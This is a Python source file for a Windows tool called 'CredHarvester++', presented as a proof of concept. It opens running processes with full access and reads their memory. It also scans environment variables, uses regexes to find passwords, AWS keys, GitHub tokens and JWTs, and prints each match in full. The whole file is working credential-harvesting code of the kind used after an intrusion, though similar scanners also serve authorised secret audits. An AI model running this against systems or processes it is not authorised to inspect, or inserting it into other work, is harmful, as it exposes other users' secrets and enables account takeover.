import ctypes
import ctypes.wintypes as wintypes
import psutil
import re
import os
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ================== Windows API ==================
PROCESS_ALL_ACCESS = 0x1F0FFF
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [wintypes.HANDLE,
                              wintypes.LPCVOID,
                              wintypes.LPVOID,
                              ctypes.c_size_t,
                              ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

# ================== Regex Patterns ==================
PATTERNS = {
    "password": re.compile(r"password\s*=\s*[\w!@#$%^&*()\-+=]{4,}"),
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "github_token": re.compile(r"ghp_[0-9a-zA-Z]{36}"),
    "jwt": re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
}

# ================== Process Memory Scanner ==================
def scan_process_memory(pid=None, max_read=4096*10):
    findings = []
    procs = []

    if pid:
        try:
            procs = [psutil.Process(pid)]
        except psutil.NoSuchProcess:
            print(Fore.RED + f"[-] No process found with PID {pid}")
            return findings
    else:
        procs = psutil.process_iter(attrs=["pid", "name"])

    for proc in procs:
        try:
            handle = OpenProcess(PROCESS_ALL_ACCESS, False, proc.pid)
            if not handle:
                continue

            buf = ctypes.create_string_buffer(max_read)
            bytesRead = ctypes.c_size_t(0)

            # NOTE: Fixed base address for PoC. Full tool should walk memory regions.
            if ReadProcessMemory(handle, ctypes.c_void_p(0x0000000140000000),
                                 buf, max_read, ctypes.byref(bytesRead)):
                text = buf.raw.decode("latin-1", errors="ignore")
                for label, pattern in PATTERNS.items():
                    for match in pattern.findall(text):
                        findings.append({
                            "type": "process_memory",
                            "pid": proc.pid,
                            "process": proc.name(),
                            "pattern": label,
                            "match": match
                        })
            CloseHandle(handle)
        except Exception:
            continue
    return findings

# ================== Env Variable Scanner ==================
def scan_env():
    findings = []
    for k, v in os.environ.items():
        for label, pattern in PATTERNS.items():
            if pattern.search(v):
                findings.append({
                    "type": "env_var",
                    "key": k,
                    "pattern": label,
                    "match": v
                })
    return findings

# ================== Pretty Output ==================
def pretty_print(results):
    print(Fore.CYAN + Style.BRIGHT + "\n[+] CredHarvester++ Results")
    print(Fore.CYAN + "---------------------------------------------")

    if not results:
        print(Fore.RED + "[-] No credentials or tokens found.")
        return

    for r in results:
        if r["type"] == "process_memory":
            print(Fore.YELLOW + f"\n[PROCESS MEMORY] PID {r['pid']} ({r['process']})")
        elif r["type"] == "env_var":
            print(Fore.YELLOW + f"\n[ENV VAR] {r['key']}")
        print(Fore.GREEN + f"  Pattern: {r['pattern']}")
        print(Fore.WHITE + f"  Match: {r['match']}")
    print(Fore.CYAN + "---------------------------------------------\n")

# ================== Main ==================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CredHarvester++ - Credential & Token Discovery Tool (Windows)")
    parser.add_argument("--process", action="store_true", help="Scan process memory")
    parser.add_argument("--env", action="store_true", help="Scan environment variables")
    parser.add_argument("--all", action="store_true", help="Run all modules")
    parser.add_argument("--pid", type=int, help="Scan specific process ID")
    args = parser.parse_args()

    results = []

    if args.process or args.all:
        if args.pid:
            print(Fore.BLUE + f"[*] Scanning memory of PID {args.pid}...")
        else:
            print(Fore.BLUE + "[*] Scanning memory of all processes...")
        results.extend(scan_process_memory(args.pid))

    if args.env or args.all:
        print(Fore.BLUE + "[*] Scanning environment variables...")
        results.extend(scan_env())

    pretty_print(results)
